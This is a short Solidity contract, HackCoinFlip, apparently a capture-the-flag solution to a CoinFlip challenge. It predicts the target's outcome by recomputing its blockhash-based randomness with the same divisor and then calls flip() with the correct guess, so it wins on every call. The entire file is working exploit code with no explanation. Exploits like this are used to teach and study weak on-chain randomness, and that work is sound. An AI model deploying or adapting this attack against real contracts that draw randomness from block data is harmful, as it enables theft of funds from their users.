// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract HackCoinFlip {
    CoinFlip public coinFlipInstance;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address coinFlipContract) {
        coinFlipInstance = CoinFlip(coinFlipContract);
    }

    function guess() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }

    function hackCoinFlip() public{
        coinFlipInstance.flip(guess());
    }

    function consecutiveWins() public view returns (uint256){
        return coinFlipInstance.consecutiveWins();
    }
}